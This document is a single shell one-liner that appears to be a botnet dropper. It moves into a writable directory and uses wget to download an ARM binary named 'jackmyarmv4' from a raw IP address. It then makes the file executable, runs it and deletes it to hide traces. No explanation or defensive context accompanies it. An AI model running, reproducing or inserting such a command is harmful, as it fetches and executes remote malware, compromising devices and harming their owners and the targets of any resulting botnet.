cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://46.183.223.246/jackmyarmv4; chmod +x jackmyarmv4; ./jackmyarmv4; rm -rf jackmyarmv4
